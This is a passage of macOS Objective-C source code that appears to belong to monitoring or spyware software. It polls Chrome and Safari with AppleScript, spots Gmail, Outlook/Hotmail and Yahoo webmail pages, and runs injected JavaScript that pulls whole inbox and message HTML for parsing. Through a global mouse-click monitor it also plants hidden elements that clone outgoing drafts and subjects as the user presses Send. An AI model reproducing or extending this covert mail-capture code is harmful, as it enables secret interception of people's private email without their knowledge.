            NSString * myHTMLSource= @"";
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n return {URL of active tab of front window, title of active tab of front window} \n end tell"];
            NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:nil];
            DLog(@"scptResult %@",[[scptResult descriptorAtIndex:1]stringValue]);
            if([self.mUrlPageChrome length]==0){
                self.mUrlPageChrome = [NSString stringWithFormat:@"%@",[[scptResult descriptorAtIndex:1]stringValue]];
                if([[[scptResult descriptorAtIndex:1]stringValue] length]>0){
                    
                    if ( ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                          && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                          && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flinbox"].location != NSNotFound) ||
                        ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                         && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                         && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flsearch"].location != NSNotFound)
                        ) {
                        
                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                        myHTMLSource = [scptResult2 stringValue];
                        [scpt2 release];
                        
                        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                            [WebmailHTMLParser Hotmail_HTMLParser:myHTMLSource];
                        });
                    }
                    
                    else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                        
                        self.mUrlPageChrome =  [NSString stringWithFormat:@"%@/%@",[[scptResult descriptorAtIndex:1]stringValue],[NSDate date]];
                        
                        //===== TEST
                        if(![self isSetSender:@"Chrome"]){
                            [self OutlookGetSender:@"Chrome"];
                        }
                        //===== TEST
                        
                        if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"inbox/rp"].location != NSNotFound ) {
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Hotmail_HTMLParser_Outlook_Incoming:@"Chrome"];
                            });
                            [self registerChromeMouseClickListener];
                        }else {
                            [self registerChromeMouseClickListener];
                        }
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                        [self registerChromeMouseClickListener];
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                        [self registerChromeMouseClickListener];
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                             [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#inbox"].location != NSNotFound) {
                        
                        NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                        inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                        
                        NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                        inboxChecker = [spliter objectAtIndex:1];
                        inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                        
                        if([inboxChecker length]>0 ){
                            
                            
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                            });
                            
                            [self registerChromeMouseClickListener];
                        }
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                             [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#search"].location != NSNotFound ) {
                        
                        NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                        inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                        
                        NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#search"];
                        inboxChecker = [spliter objectAtIndex:1];
                        if ( ( [[inboxChecker componentsSeparatedByString:@"/"] count] - 1 ) == 2 ) {
                            
                            DLog(@"Gmail Implement Search");
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                            });
                            
                        }
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound  ) {
                        DLog(@"Change Yahoo");
                        
                        if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location == NSNotFound ) {
                            NSAppleScript *isInInbox=[[NSAppleScript alloc]initWithSource:@"delay 0.2 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.getElementById('Inbox').childNodes[1].getAttribute('aria-selected'); return myVar;} secretUrl();\" \n return the result \n end tell"];
                            NSAppleEventDescriptor *isInInboxResult =[isInInbox executeAndReturnError:nil];
                            if ([[isInInboxResult stringValue] isEqualToString:@"true"]) {
                                DLog(@"in Inbox");
                                NSAppleScript *isInMainList=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.getElementById('inboxcontainer').getAttribute('style'); return myVar;} secretUrl();\" \n return the result \n end tell"];
                                NSAppleEventDescriptor *isInMainListResult =[isInMainList executeAndReturnError:nil];
                                if ([[isInMainListResult stringValue] isEqualToString:@"visibility: hidden;"]) {
                                    DLog(@"Not in Main");
                                    sleep(2.5);
                                    NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                                    NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                    myHTMLSource = [scptResult2 stringValue];
                                    [scpt2 release];
                                    
                                    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                        [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Chrome"];
                                    });
                                }
                                [isInMainList release];
                            }
                            [isInInbox release];
                        }else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location != NSNotFound ) {
                            DLog(@"Basic go");
                            if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose?"].location == NSNotFound ) {
                                sleep(1.5);
                            }
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Chrome"];
                            });
                        }
                    }
                    //Add Case
                }
            }else{
                DLog(@"Change URL");
                NSString * original = self.mUrlPageChrome;
                if(![original isEqualToString:[[scptResult descriptorAtIndex:1]stringValue]]){
                    if([[[scptResult descriptorAtIndex:1]stringValue] length]>0){
                       
                        if ( ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                              && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                              && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flinbox"].location != NSNotFound) ||
                            ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                             && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                             && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flsearch"].location != NSNotFound)
                            ) {
                            DLog(@"URL Changed inHotmail");
                            self.mUrlPageChrome =  [[scptResult descriptorAtIndex:1]stringValue];
                            
                            NSAppleScript *scpt2 = [[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Hotmail_HTMLParser:myHTMLSource];
                            });
                        }
                        
                        else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                            DLog(@"URL Changed Out Outlook");
                            self.mUrlPageChrome =  [NSString stringWithFormat:@"%@/%@",[[scptResult descriptorAtIndex:1]stringValue],[NSDate date]];
                            
                            //===== TEST
                            if(![self isSetSender:@"Chrome"]){
                                [self OutlookGetSender:@"Chrome"];
                            }
                            //===== TEST
                            
                            if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"inbox/rp"].location != NSNotFound ) {
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Hotmail_HTMLParser_Outlook_Incoming:@"Chrome"];
                                });
                                [self registerChromeMouseClickListener];
                            }else {
                                [self registerChromeMouseClickListener];
                            }
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                            DLog(@"URL Changed OutHotmail");
                            self.mUrlPageChrome =  [[scptResult descriptorAtIndex:1]stringValue];
                            
                            [self registerChromeMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                            DLog(@"URL Changed OutGmail");
                            self.mUrlPageChrome =  [[scptResult descriptorAtIndex:1]stringValue];
                            
                            [self registerChromeMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                                 [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#inbox"].location != NSNotFound) {
                            
                            NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                            inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                            
                            NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                            inboxChecker = [spliter objectAtIndex:1];
                            inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                            
                            if([inboxChecker length]>0){
                                DLog(@"URL Changed inGmail");
                                self.mUrlPageChrome =  [[scptResult descriptorAtIndex:1]stringValue];
                                
                                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                                NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                myHTMLSource = [scptResult2 stringValue];
                                [scpt2 release];
                                
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                                });
                                
                                [self registerChromeMouseClickListener];
                            }
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                                 [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#search"].location != NSNotFound ) {
                            
                            NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                            inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                            
                            NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#search"];
                            inboxChecker = [spliter objectAtIndex:1];
                            if ( ( [[inboxChecker componentsSeparatedByString:@"/"] count] - 1 ) == 2 ) {
                                
                                DLog(@"Gmail Implement Search");
                                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                                NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                myHTMLSource = [scptResult2 stringValue];
                                [scpt2 release];
                                
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                                });
                                
                            }
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound  ) {
                            DLog(@"URL Change Yahoo");
                            self.mUrlPageChrome =  [[scptResult descriptorAtIndex:1]stringValue];
                            
                            if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location == NSNotFound ) {
                                NSAppleScript *isInInbox=[[NSAppleScript alloc]initWithSource:@"delay 0.2 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.getElementById('Inbox').childNodes[1].getAttribute('aria-selected'); return myVar;} secretUrl();\" \n return the result \n end tell"];
                                NSAppleEventDescriptor *isInInboxResult =[isInInbox executeAndReturnError:nil];
                                if ([[isInInboxResult stringValue] isEqualToString:@"true"]) {
                                    DLog(@"in Inbox");
                                    NSAppleScript *isInMainList=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.getElementById('inboxcontainer').getAttribute('style'); return myVar;} secretUrl();\" \n return the result \n end tell"];
                                    NSAppleEventDescriptor *isInMainListResult =[isInMainList executeAndReturnError:nil];
                                    if ([[isInMainListResult stringValue] isEqualToString:@"visibility: hidden;"]) {
                                        DLog(@"Not in Main");
                                        sleep(2.5);
                                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                                        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                        myHTMLSource = [scptResult2 stringValue];
                                        [scpt2 release];
                                        
                                        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                            [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Chrome"];
                                        });
                                    }
                                    [isInMainList release];
                                }
                                [isInInbox release];
                            }else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location != NSNotFound ) {
                                DLog(@"Basic go");
                                if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose?"].location == NSNotFound ) {
                                    sleep(1.5);
                                }
                                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                                NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                myHTMLSource = [scptResult2 stringValue];
                                [scpt2 release];
                                
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Chrome"];
                                });
                            }
                        }
                        //Add Case
                    }
                }else{
                    DLog(@"Out change");
                    if([[[scptResult descriptorAtIndex:1]stringValue] length]>0 ){
                        if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                            [self registerChromeMouseClickListener];
                        }
                        
                        else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                                [self registerChromeMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                            [self registerChromeMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound ) {
                            
                            NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                            if ([inboxChecker rangeOfString:@"#inbox"].location != NSNotFound) {
                                NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                                inboxChecker = [spliter objectAtIndex:1];
                                inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                                if([inboxChecker length]>0 ){
                                    [self registerChromeMouseClickListener];
                                }
                            }
                        }
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound  ) {
                            if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location == NSNotFound ){
                                    [self registerYahooMouseClickListenerWithType:@"Chrome"];
                            }else{
                                if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location != NSNotFound    &&
                                     [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose?"].location != NSNotFound ){
                                    [self yahooAddScript:@"Chrome"];
                                    [self registerYahooMouseClickListenerWithType:@"Chrome"];
                                }
                            }
                            
                        }
                    }
                }
            }
            [scpt release];
        }
        [pool drain];
        DLog(@"End startAnalyzeCallback");
    }@catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
}

#pragma mark -Register / Unregister MouseClickListener
-(void)registerSafariMouseClickListener{
    @try{
        if (mouseEventHandler) {
            [self unregisterMouseClickListener];
        }
        mouseEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent * mouseEvent) {
            
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 0.5 \n tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
            NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
            [scpt release];
            
            if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                NSString * myHTMLSource = [scptResult stringValue];
                [scpt release];
                
                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue1() { var rm = document.getElementById('SendMessage'); rm.onmouseenter = function(){ var btag = document.getElementsByTagName('body'); var node = document.createElement('div'); node.setAttribute('class', 'hm_cap_s'); node.setAttribute('hidden', true); btag[0].appendChild(node); } } myValue1();function myValue2() { var rm = document.getElementById('SendMessage'); rm.onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('hm_cap_s'); for(var j = 0; j < node.length; j++) { node[j].parentNode.removeChild(node[j]); } },500); } } myValue2();\" in document 1 \n return the result \n end tell"];
                [scpt2 executeAndReturnError:nil];
                [scpt2 release];
                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                    [WebmailHTMLParser Hotmail_HTMLParser_Outgoing:myHTMLSource type:@"Safari"];
                });
                
            }
            
            else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                if ([self OutlookCheckIsCompose:@"Safari"]) {
                    if(![self isSetSender:@"Safari"]){
                        [self OutlookGetSender:@"Safari"];
                    }
                    [self OutlookAddScript:@"Safari"];
                    
                    NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                    NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                    NSString * myHTMLSource = [scptResult stringValue];
                    [scpt release];

                    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                        [WebmailHTMLParser Hotmail_HTMLParser_Outlook_Outgoing:myHTMLSource];
                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"  function cleaner() { var remover = document.getElementsByClassName('ol_cap');for( var k=0;k<remover.length;k++){remover[k].parentNode.removeChild(remover[k]);}}cleaner(); \" in document 1  \n return the result \n end tell"];
                        [scpt2 executeAndReturnError:nil];
                        [scpt2 release];
                    });
                }
            }
            
            else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                NSString * myHTMLSource = [scptResult stringValue];
                [scpt release];
                
                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('nH Hd'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[j].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();\" in document 1 \n return the result \n end tell"];
                [scpt2 executeAndReturnError:nil];
                [scpt2 release];
                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                    [WebmailHTMLParser Gmail_HTMLParser_Outgoing:myHTMLSource type:@"Safari"];
                });
            }
            else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound ) {
                NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                
                if ([inboxChecker rangeOfString:@"#inbox"].location != NSNotFound) {
                    NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                    inboxChecker = [spliter objectAtIndex:1];
                    inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                    
                    if([inboxChecker length]>0 ){
                        
                        sleep(1.2);
                        
                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                        NSString * myHTMLSource = [scptResult stringValue];
                        [scpt release];
                        
                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('gA gt'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[0].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();\" in document 1 \n return the result \n end tell"];
                        [scpt2 executeAndReturnError:nil];
                        [scpt2 release];
                        
                        NSAppleScript *scpt3=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() {var myVar = document.getElementsByClassName('nH Hd')[0].innerHTML;return myVar;} myValue(); \" in document 1 \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult3 = [scpt3 executeAndReturnError:nil];
                        NSString *checker = [scptResult3 stringValue];
                        [scpt3 release];
                        
                        if ([checker length]>0) {
                            NSAppleScript *scpt4=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('nH Hd'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[j].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();\" in document 1 \n return the result \n end tell"];
                            [scpt4 executeAndReturnError:nil];
                            [scpt4 release];
                        }
                        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                            [WebmailHTMLParser Gmail_HTMLParser_InMail_Outgoing:myHTMLSource type:@"Safari"];
                        });
                    }
                }
            }
            else{
                [self unregisterMouseClickListener];
            }
            
        }];
    }@catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
}
-(void)registerChromeMouseClickListener{
    @try{
        if (mouseEventHandler) {
            [self unregisterMouseClickListener];
        }
        mouseEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent * mouseEvent) {
            
